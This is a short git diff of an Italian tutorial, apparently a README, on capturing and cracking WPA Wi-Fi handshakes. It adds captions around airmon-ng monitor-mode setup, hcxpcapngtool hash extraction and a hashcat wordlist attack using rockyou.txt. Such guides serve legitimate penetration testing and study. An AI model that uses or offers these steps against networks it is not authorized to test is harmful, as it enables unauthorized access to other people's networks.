@@ -7,6 +7,7 @@ oppure
 ```
 ip a
 ```
+Uccidere i processi di interferebilità
 avvia scheda di rete in monitor mode
 ```
 sudo airmon-ng check kill
@@ -56,11 +57,11 @@ hcxpcapngtool -o hash.hc22000 -E essidlist frames_to_recover_the_psk.pcapng
 ```
 ![Screenshot_20250314_015237](https://github.com/user-attachments/assets/eeed436d-d573-4c33-986f-15ea31dcf081)
 
-
+mantieni solo la linea che ti interessa craccare
 ```
 sudo nano hash.hc22000
 ```
-
+crack con hashcat
 ```
 hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt
 ```
